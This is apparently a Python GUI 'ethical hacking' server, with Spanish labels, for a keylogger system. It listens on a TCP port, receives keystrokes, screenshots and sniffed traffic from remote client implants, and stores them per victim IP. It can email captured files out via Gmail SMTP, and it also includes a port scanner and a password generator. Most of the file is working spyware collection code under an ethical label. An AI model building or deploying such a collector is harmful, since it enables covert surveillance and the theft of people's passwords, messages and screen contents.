#!/usr/bin/env python3
"""
=============================================================
  🔐 SERVIDOR DE HACKING ÉTICO - Ciberseguridad
  Módulos: Keylogger | Port Scanner | Password Gen | Sniffer
=============================================================
"""

import socket
import threading
import os
import json
import string
import random
import smtplib
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

# ── Configuración ──────────────────────────────────────────
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 9999
LOG_DIR = "logs"
SCREENSHOT_DIR = "screenshots"
SNIFF_DIR = "sniff_captures"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

COMMON_PORTS = {
    20: "FTP-Data", 21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
    53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS",
    445: "SMB", 993: "IMAPS", 995: "POP3S", 3306: "MySQL",
    3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 8080: "HTTP-Alt",
    8443: "HTTPS-Alt", 27017: "MongoDB"
}

def load_env(filepath=".env"):
    env = {}
    try:
        with open(filepath, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    key, value = line.split("=", 1)
                    env[key.strip()] = value.strip()
    except FileNotFoundError:
        pass
    return env

_env = load_env()
EMAIL_USER = _env.get("EMAIL_USER", "")
EMAIL_PASS = _env.get("EMAIL_PASS", "")
EMAIL_TO = _env.get("EMAIL_TO", "")


class ServerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("🔐 Servidor Hacking Ético - Ciberseguridad")
        self.root.geometry("900x700")
        self.root.configure(bg="#1a1a2e")
        self.root.resizable(True, True)

        self.server_socket = None
        self.running = False
        self.email_enabled = True
        self.clients_count = 0

        for d in [LOG_DIR, SCREENSHOT_DIR, SNIFF_DIR]:
            os.makedirs(d, exist_ok=True)

        self._build_gui()

    # ══════════════════════════════════════════════════════
    #  GUI PRINCIPAL
    # ══════════════════════════════════════════════════════

    def _build_gui(self):
        bg = "#1a1a2e"
        accent = "#0f3460"

        # Header
        header = tk.Frame(self.root, bg=accent, pady=8)
        header.pack(fill=tk.X)
        tk.Label(header, text="🔐 SERVIDOR DE HACKING ÉTICO",
                 font=("Helvetica", 16, "bold"), bg=accent, fg="white").pack()

        # Config frame
        cfg = tk.LabelFrame(self.root, text=" ⚙ Servidor ", font=("Helvetica", 10, "bold"),
                            bg=bg, fg="#e0e0e0", padx=8, pady=5)
        cfg.pack(fill=tk.X, padx=8, pady=(5, 2))

        row = tk.Frame(cfg, bg=bg)
        row.pack(fill=tk.X)

        tk.Label(row, text="Host:", bg=bg, fg="#e0e0e0", font=("Helvetica", 9)).pack(side=tk.LEFT)
        self.host_entry = tk.Entry(row, width=12, bg="#16213e", fg="#e0e0e0",
                                   insertbackground="#e0e0e0", font=("Courier", 9))
        self.host_entry.insert(0, DEFAULT_HOST)
        self.host_entry.pack(side=tk.LEFT, padx=(3, 12))

        tk.Label(row, text="Puerto:", bg=bg, fg="#e0e0e0", font=("Helvetica", 9)).pack(side=tk.LEFT)
        self.port_entry = tk.Entry(row, width=6, bg="#16213e", fg="#e0e0e0",
                                   insertbackground="#e0e0e0", font=("Courier", 9))
        self.port_entry.insert(0, str(DEFAULT_PORT))
        self.port_entry.pack(side=tk.LEFT, padx=3)

        local_ip = self._get_local_ip()
        tk.Label(row, text=f"📡 IP: {local_ip}", bg=bg, fg="#00d2ff",
                 font=("Courier", 9, "bold")).pack(side=tk.LEFT, padx=15)

        self.start_btn = tk.Button(row, text="▶ INICIAR", font=("Helvetica", 9, "bold"),
                                   bg="#28a745", fg="white", cursor="hand2", padx=10,
                                   command=self.start_server)
        self.start_btn.pack(side=tk.LEFT, padx=5)

        self.stop_btn = tk.Button(row, text="⏹ DETENER", font=("Helvetica", 9, "bold"),
                                  bg="#e94560", fg="white", cursor="hand2", padx=10,
                                  state=tk.DISABLED, command=self.stop_server)
        self.stop_btn.pack(side=tk.LEFT, padx=2)

        self.status_label = tk.Label(row, text="● Detenido", font=("Helvetica", 9),
                                     bg=bg, fg="#ff6b6b")
        self.status_label.pack(side=tk.RIGHT, padx=5)

        self.clients_label = tk.Label(row, text="Clientes: 0", font=("Helvetica", 9),
                                      bg=bg, fg="#aaa")
        self.clients_label.pack(side=tk.RIGHT, padx=5)

        # Notebook (Tabs)
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TNotebook", background=bg, borderwidth=0)
        style.configure("TNotebook.Tab", background="#16213e", foreground="#e0e0e0",
                        padding=[12, 4], font=("Helvetica", 10, "bold"))
        style.map("TNotebook.Tab", background=[("selected", "#0f3460")])

        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=8, pady=5)

        self._build_keylogger_tab()
        self._build_scanner_tab()
        self._build_password_tab()
        self._build_sniffer_tab()

    # ══════════════════════════════════════════════════════
    #  TAB 1: KEYLOGGER
    # ══════════════════════════════════════════════════════

    def _build_keylogger_tab(self):
        bg = "#1a1a2e"
        frame = tk.Frame(self.notebook, bg=bg)
        self.notebook.add(frame, text="⌨ Keylogger")

        self.key_log = scrolledtext.ScrolledText(frame, bg="#0d1117", fg="#58a6ff",
                                                  font=("Courier", 10), state=tk.DISABLED, wrap=tk.WORD)
        self.key_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        for tag, color in [("info", "#58a6ff"), ("success", "#3fb950"), ("warning", "#d29922"),
                           ("error", "#f85149"), ("key", "#bc8cff"), ("screenshot", "#79c0ff")]:
            self.key_log.tag_config(tag, foreground=color)

    # ══════════════════════════════════════════════════════
    #  TAB 2: ESCÁNER DE PUERTOS
    # ══════════════════════════════════════════════════════

    def _build_scanner_tab(self):
        bg = "#1a1a2e"
        fg = "#e0e0e0"
        frame = tk.Frame(self.notebook, bg=bg)
        self.notebook.add(frame, text="🔍 Port Scanner")

        # Fila 1: IP objetivo
        row1 = tk.Frame(frame, bg=bg, pady=5)
        row1.pack(fill=tk.X, padx=5)

        tk.Label(row1, text="IP objetivo:", bg=bg, fg=fg, font=("Helvetica", 10)).pack(side=tk.LEFT)
        self.scan_ip = tk.Entry(row1, width=16, bg="#16213e", fg=fg,
                                insertbackground=fg, font=("Courier", 10))
        self.scan_ip.insert(0, "192.168.1.1")
        self.scan_ip.pack(side=tk.LEFT, padx=5)

        self.scan_progress = tk.Label(row1, text="", bg=bg, fg="#aaa", font=("Helvetica", 9))
        self.scan_progress.pack(side=tk.RIGHT, padx=5)

        # Fila 2: Rango de puertos
        row2 = tk.Frame(frame, bg=bg, pady=3)
        row2.pack(fill=tk.X, padx=5)

        tk.Label(row2, text="Desde:", bg=bg, fg=fg, font=("Helvetica", 10)).pack(side=tk.LEFT)
        self.scan_from = tk.Entry(row2, width=6, bg="#16213e", fg=fg,
                                  insertbackground=fg, font=("Courier", 10))
        self.scan_from.insert(0, "1")
        self.scan_from.pack(side=tk.LEFT, padx=3)

        tk.Label(row2, text="Hasta:", bg=bg, fg=fg, font=("Helvetica", 10)).pack(side=tk.LEFT)
        self.scan_to = tk.Entry(row2, width=6, bg="#16213e", fg=fg,
                                insertbackground=fg, font=("Courier", 10))
        self.scan_to.insert(0, "1024")
        self.scan_to.pack(side=tk.LEFT, padx=3)

        tk.Label(row2, text="Puerto específico:", bg=bg, fg=fg, font=("Helvetica", 10)).pack(side=tk.LEFT, padx=(15, 0))
        self.scan_single = tk.Entry(row2, width=6, bg="#16213e", fg=fg,
                                    insertbackground=fg, font=("Courier", 10))
        self.scan_single.insert(0, "80")
        self.scan_single.pack(side=tk.LEFT, padx=3)

        # Fila 3: Botones de escaneo
        row3 = tk.Frame(frame, bg=bg, pady=5)
        row3.pack(fill=tk.X, padx=5)

        self.scan_range_btn = tk.Button(row3, text="🔍 Escanear Rango", font=("Helvetica", 10, "bold"),
                                        bg="#f0c040", fg="#111", cursor="hand2", padx=10,
                                        command=lambda: self._start_scan("range"))
        self.scan_range_btn.pack(side=tk.LEFT, padx=5)

        self.scan_single_btn = tk.Button(row3, text="🎯 Puerto Específico", font=("Helvetica", 10, "bold"),
                                         bg="#28a745", fg="white", cursor="hand2", padx=10,
                                         command=lambda: self._start_scan("single"))
        self.scan_single_btn.pack(side=tk.LEFT, padx=5)

        self.scan_all_btn = tk.Button(row3, text="🌐 Todos (1-65535)", font=("Helvetica", 10, "bold"),
                                      bg="#e94560", fg="white", cursor="hand2", padx=10,
                                      command=lambda: self._start_scan("all"))
        self.scan_all_btn.pack(side=tk.LEFT, padx=5)

        self.scan_log = scrolledtext.ScrolledText(frame, bg="#0d1117", fg="#58a6ff",
                                                   font=("Courier", 10), state=tk.DISABLED, wrap=tk.WORD)
        self.scan_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.scan_log.tag_config("open", foreground="#3fb950")
        self.scan_log.tag_config("info", foreground="#58a6ff")
        self.scan_log.tag_config("warn", foreground="#d29922")

    def _set_scan_buttons(self, state):
        self.scan_range_btn.config(state=state)
        self.scan_single_btn.config(state=state)
        self.scan_all_btn.config(state=state)

    def _start_scan(self, mode):
        ip = self.scan_ip.get().strip()
        if not ip:
            messagebox.showerror("Error", "Ingresa una IP")
            return

        if mode == "single":
            try:
                port = int(self.scan_single.get().strip())
            except ValueError:
                messagebox.showerror("Error", "Puerto inválido")
                return
            p_from, p_to = port, port
        elif mode == "all":
            p_from, p_to = 1, 65535
        else:  # range
            try:
                p_from = int(self.scan_from.get().strip())
                p_to = int(self.scan_to.get().strip())
            except ValueError:
                messagebox.showerror("Error", "Rango de puertos inválido")
                return

        self._set_scan_buttons(tk.DISABLED)
        label = f"puerto {p_from}" if p_from == p_to else f"puertos {p_from}-{p_to}"
        self._scan_append(f"═══ Escaneando {ip} {label} ═══\n", "info")
        threading.Thread(target=self._run_scan, args=(ip, p_from, p_to), daemon=True).start()

    def _run_scan(self, ip, p_from, p_to):
        open_ports = []
        total = p_to - p_from + 1
        scanned = 0

        for port in range(p_from, p_to + 1):
            scanned += 1
            if scanned % 50 == 0 or total == 1:
                pct = int(scanned / total * 100)
                self.root.after(0, self.scan_progress.config, {"text": f"{pct}%"})
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                result = s.connect_ex((ip, port))
                s.close()
                if result == 0:
                    svc = COMMON_PORTS.get(port, "Desconocido")
                    open_ports.append((port, svc))
                    self._scan_append(f"  ✅ Puerto {port:>5} ABIERTO  ({svc})\n", "open")
            except Exception:
                pass

        if not open_ports:
            self._scan_append(f"  ⚠ No se encontraron puertos abiertos\n", "warn")

        self._scan_append(f"\n═══ Escaneo completo: {len(open_ports)} puertos abiertos de {total} escaneados ═══\n", "info")
        self.root.after(0, self._set_scan_buttons, tk.NORMAL)
        self.root.after(0, self.scan_progress.config, {"text": "Listo"})

    def _scan_append(self, text, tag="info"):
        def _do():
            self.scan_log.config(state=tk.NORMAL)
            self.scan_log.insert(tk.END, text, tag)
            self.scan_log.see(tk.END)
            self.scan_log.config(state=tk.DISABLED)
        self.root.after(0, _do)

    # ══════════════════════════════════════════════════════
    #  TAB 3: GENERADOR DE CONTRASEÑAS
    # ══════════════════════════════════════════════════════

    def _build_password_tab(self):
        bg = "#1a1a2e"
        fg = "#e0e0e0"
        frame = tk.Frame(self.notebook, bg=bg)
        self.notebook.add(frame, text="🔑 Password Gen")

        ctrl = tk.Frame(frame, bg=bg, pady=10)
        ctrl.pack(padx=20, pady=10, fill=tk.X)

        tk.Label(ctrl, text="Longitud (mín. 8):", bg=bg, fg=fg, font=("Helvetica", 11)).grid(row=0, column=0, sticky="w", pady=3)
        self.pwd_len = tk.Entry(ctrl, width=6, bg="#16213e", fg=fg, insertbackground=fg, font=("Courier", 12))
        self.pwd_len.insert(0, "16")
        self.pwd_len.grid(row=0, column=1, sticky="w", padx=5, pady=3)

        self.pwd_upper = tk.BooleanVar(value=True)
        self.pwd_lower = tk.BooleanVar(value=True)
        self.pwd_digits = tk.BooleanVar(value=True)
        self.pwd_special = tk.BooleanVar(value=True)

        opts = [("Mayúsculas (A-Z)", self.pwd_upper), ("Minúsculas (a-z)", self.pwd_lower),
                ("Números (0-9)", self.pwd_digits), ("Especiales (!@#$)", self.pwd_special)]
        for i, (label, var) in enumerate(opts):
            tk.Checkbutton(ctrl, text=label, variable=var, bg=bg, fg=fg,
                          selectcolor="#16213e", font=("Helvetica", 10),
                          activebackground=bg, activeforeground=fg).grid(row=i+1, column=0, columnspan=2, sticky="w", pady=1)

        tk.Label(ctrl, text="Cantidad:", bg=bg, fg=fg, font=("Helvetica", 11)).grid(row=0, column=2, sticky="w", padx=(30, 0), pady=3)
        self.pwd_qty = tk.Entry(ctrl, width=4, bg="#16213e", fg=fg, insertbackground=fg, font=("Courier", 12))
        self.pwd_qty.insert(0, "5")
        self.pwd_qty.grid(row=0, column=3, sticky="w", padx=5, pady=3)

        btn_frame = tk.Frame(ctrl, bg=bg)
        btn_frame.grid(row=1, column=2, columnspan=2, pady=5, padx=(30, 0), sticky="w")

        tk.Button(btn_frame, text="🔑 Generar", font=("Helvetica", 11, "bold"),
                  bg="#f0c040", fg="#111", cursor="hand2", padx=15, pady=3,
                  command=self._generate_passwords).pack(side=tk.LEFT, padx=(0, 8))

        tk.Button(btn_frame, text="📋 Copiar Todas", font=("Helvetica", 11, "bold"),
                  bg="#28a745", fg="white", cursor="hand2", padx=15, pady=3,
                  command=self._copy_all_passwords).pack(side=tk.LEFT)

        # Frame scrollable para contraseñas con botones de copiar
        self.pwd_list_frame = tk.Frame(frame, bg="#0d1117")
        self.pwd_list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))

        self.pwd_canvas = tk.Canvas(self.pwd_list_frame, bg="#0d1117", highlightthickness=0)
        self.pwd_scrollbar = tk.Scrollbar(self.pwd_list_frame, orient="vertical", command=self.pwd_canvas.yview)
        self.pwd_inner = tk.Frame(self.pwd_canvas, bg="#0d1117")

        self.pwd_inner.bind("<Configure>", lambda e: self.pwd_canvas.configure(scrollregion=self.pwd_canvas.bbox("all")))
        self.pwd_canvas.create_window((0, 0), window=self.pwd_inner, anchor="nw")
        self.pwd_canvas.configure(yscrollcommand=self.pwd_scrollbar.set)

        self.pwd_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.pwd_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        self.generated_passwords = []

    def _copy_to_clipboard(self, text):
        self.root.clipboard_clear()
        self.root.clipboard_append(text)

    def _copy_all_passwords(self):
        if not self.generated_passwords:
            messagebox.showinfo("Info", "No hay contraseñas generadas")
            return
        all_pwds = "\n".join(self.generated_passwords)
        self._copy_to_clipboard(all_pwds)
        messagebox.showinfo("Copiado", f"{len(self.generated_passwords)} contraseñas copiadas al portapapeles")

    def _generate_passwords(self):
        try:
            length = int(self.pwd_len.get().strip())
            qty = int(self.pwd_qty.get().strip())
        except ValueError:
            messagebox.showerror("Error", "Valores inválidos")
            return

        if length < 8:
            messagebox.showerror("Error", "La longitud mínima es de 8 caracteres")
            return

        charset = ""
        if self.pwd_upper.get(): charset += string.ascii_uppercase
        if self.pwd_lower.get(): charset += string.ascii_lowercase
        if self.pwd_digits.get(): charset += string.digits
        if self.pwd_special.get(): charset += "!@#$%^&*()-_=+[]{}|;:,.<>?"

        if not charset:
            messagebox.showerror("Error", "Selecciona al menos un tipo de carácter")
            return

        # Limpiar lista anterior
        for widget in self.pwd_inner.winfo_children():
            widget.destroy()
        self.generated_passwords = []

        # Header
        tk.Label(self.pwd_inner, text=f"═══ {qty} contraseñas de {length} caracteres ═══",
                 bg="#0d1117", fg="#58a6ff", font=("Courier", 11, "bold")).pack(anchor="w", padx=10, pady=(10, 5))

        for i in range(qty):
            pwd = ''.join(random.SystemRandom().choice(charset) for _ in range(length))
            self.generated_passwords.append(pwd)

            row = tk.Frame(self.pwd_inner, bg="#0d1117")
            row.pack(fill=tk.X, padx=10, pady=2)

            tk.Label(row, text=f" {i+1:>2}. {pwd}",
                     bg="#0d1117", fg="#3fb950", font=("Courier", 12),
                     anchor="w").pack(side=tk.LEFT, fill=tk.X, expand=True)

            tk.Button(row, text="📋", font=("Helvetica", 9),
                      bg="#16213e", fg="#e0e0e0", cursor="hand2",
                      relief="flat", padx=5, pady=0,
                      command=lambda p=pwd: self._copy_to_clipboard(p)).pack(side=tk.RIGHT, padx=5)

        tk.Label(self.pwd_inner, text="═══ random.SystemRandom (criptográfico) ═══",
                 bg="#0d1117", fg="#58a6ff", font=("Courier", 10)).pack(anchor="w", padx=10, pady=(5, 10))

    # ══════════════════════════════════════════════════════
    #  TAB 4: SNIFFER
    # ══════════════════════════════════════════════════════

    def _build_sniffer_tab(self):
        bg = "#1a1a2e"
        frame = tk.Frame(self.notebook, bg=bg)
        self.notebook.add(frame, text="📡 Sniffer")

        tk.Label(frame, text="Capturas de tráfico recibidas de los clientes:",
                 bg=bg, fg="#e0e0e0", font=("Helvetica", 10)).pack(anchor="w", padx=5, pady=5)

        self.sniff_log = scrolledtext.ScrolledText(frame, bg="#0d1117", fg="#79c0ff",
                                                    font=("Courier", 10), state=tk.DISABLED, wrap=tk.WORD)
        self.sniff_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.sniff_log.tag_config("pkt", foreground="#00d2ff") # Cian brillante
        self.sniff_log.tag_config("info", foreground="#58a6ff")
        self.sniff_log.tag_config("file", foreground="#3fb950")
        self.sniff_log.tag_config("intel", foreground="#f0c040") # Oro para inteligencia de red

    def _sniff_append(self, text, tag="info"):
        def _do():
            self.sniff_log.config(state=tk.NORMAL)
            self.sniff_log.insert(tk.END, text, tag)
            self.sniff_log.see(tk.END)
            self.sniff_log.config(state=tk.DISABLED)
        self.root.after(0, _do)

    # ══════════════════════════════════════════════════════
    #  SERVIDOR TCP
    # ══════════════════════════════════════════════════════

    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "No disponible"

    def _log(self, message, tag="info"):
        ts = datetime.now().strftime("%H:%M:%S")
        def _do():
            self.key_log.config(state=tk.NORMAL)
            self.key_log.insert(tk.END, f"[{ts}] {message}\n", tag)
            self.key_log.see(tk.END)
            self.key_log.config(state=tk.DISABLED)
        self.root.after(0, _do)

    def start_server(self):
        host = self.host_entry.get().strip()
        try:
            port = int(self.port_entry.get().strip())
        except ValueError:
            messagebox.showerror("Error", "Puerto inválido")
            return

        self.running = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.host_entry.config(state=tk.DISABLED)
        self.port_entry.config(state=tk.DISABLED)
        self.status_label.config(text="● Activo", fg="#3fb950")

        threading.Thread(target=self._run_server, args=(host, port), daemon=True).start()

    def _run_server(self, host, port):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.settimeout(1.0)
            self.server_socket.bind((host, port))
            self.server_socket.listen(5)
            self._log(f"Servidor iniciado en {host}:{port}", "success")
            self._log("Esperando conexiones...", "info")

            while self.running:
                try:
                    conn, addr = self.server_socket.accept()
                    self.clients_count += 1
                    self.root.after(0, self.clients_label.config,
                                    {"text": f"Clientes: {self.clients_count}"})
                    threading.Thread(target=self._handle_client, args=(conn, addr), daemon=True).start()
                except socket.timeout:
                    continue
        except Exception as e:
            self._log(f"Error: {e}", "error")
        finally:
            if self.server_socket:
                self.server_socket.close()

    def stop_server(self):
        self.running = False
        self._log("Servidor detenido.", "warning")
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.host_entry.config(state=tk.NORMAL)
        self.port_entry.config(state=tk.NORMAL)
        self.status_label.config(text="● Detenido", fg="#ff6b6b")
        self.clients_count = 0
        self.root.after(0, self.clients_label.config, {"text": "Clientes: 0"})

    def _handle_client(self, conn, addr):
        client_ip = addr[0]
        ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        log_file_path = os.path.join(LOG_DIR, f"keylog_{client_ip}_{ts}.txt")
        self._log(f"✅ Cliente conectado: {client_ip}:{addr[1]}", "success")

        buffer = b""
        try:
            with open(log_file_path, "a", encoding="utf-8") as log_file:
                log_file.write(f"=== Sesión: {ts} | Cliente: {client_ip} ===\n\n")

                while self.running:
                    while b"\n" not in buffer:
                        chunk = conn.recv(4096)
                        if not chunk:
                            raise ConnectionError("Desconectado")
                        buffer += chunk

                    header_line, buffer = buffer.split(b"\n", 1)
                    try:
                        header = json.loads(header_line.decode("utf-8"))
                    except json.JSONDecodeError:
                        continue

                    msg_type = header.get("type", "")
                    payload_size = header.get("size", 0)

                    while len(buffer) < payload_size:
                        chunk = conn.recv(4096)
                        if not chunk:
                            raise ConnectionError("Desconectado")
                        buffer += chunk

                    payload = buffer[:payload_size]
                    buffer = buffer[payload_size:]

                    if msg_type == "keys":
                        text = payload.decode("utf-8", errors="replace")
                        t = datetime.now().strftime("%H:%M:%S")
                        log_file.write(f"[{t}] {text}\n")
                        log_file.flush()
                        display = text.replace("\n", "↵")[:60]
                        self._log(f"⌨ [{client_ip}] {display}", "key")

                    elif msg_type == "screenshot":
                        fname = header.get("filename", f"ss_{client_ip}_{ts}.png")
                        path = os.path.join(SCREENSHOT_DIR, fname)
                        with open(path, "wb") as f:
                            f.write(payload)
                        kb = len(payload) / 1024
                        self._log(f"📷 Screenshot: {fname} ({kb:.1f} KB)", "screenshot")

                    elif msg_type == "sniff":
                        fname = header.get("filename", f"sniff_{client_ip}_{ts}.txt")
                        path = os.path.join(SNIFF_DIR, fname)
                        with open(path, "ab") as f:
                            f.write(payload)
                        text = payload.decode("utf-8", errors="replace")
                        self._sniff_append(f"[{client_ip}] {text}", "pkt")
                        self._sniff_append(f"  📁 Guardado: {fname}\n", "file")

        except ConnectionError:
            self._log(f"❌ Desconectado: {client_ip}", "warning")
        except Exception as e:
            self._log(f"Error con {client_ip}: {e}", "error")
        finally:
            conn.close()
            self.clients_count = max(0, self.clients_count - 1)
            self.root.after(0, self.clients_label.config,
                            {"text": f"Clientes: {self.clients_count}"})

    def send_email(self, filepath):
        try:
            msg = MIMEMultipart()
            msg["From"] = EMAIL_USER
            msg["To"] = EMAIL_TO
            msg["Subject"] = "📷 Captura - Hacking Ético"
            body = f"Captura: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nArchivo: {os.path.basename(filepath)}"
            msg.attach(MIMEText(body, "plain"))
            with open(filepath, "rb") as f:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(filepath)}")
                msg.attach(part)
            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()
                server.login(EMAIL_USER, EMAIL_PASS)
                server.sendmail(EMAIL_USER, EMAIL_TO, msg.as_string())
            self._log(f"✉ Email enviado: {os.path.basename(filepath)}", "success")
        except Exception as e:
            self._log(f"Error email: {e}", "error")


def main():
    root = tk.Tk()
    app = ServerApp(root)
    root.protocol("WM_DELETE_WINDOW", lambda: (app.stop_server(), root.destroy()))
    root.mainloop()


if __name__ == "__main__":
    main()
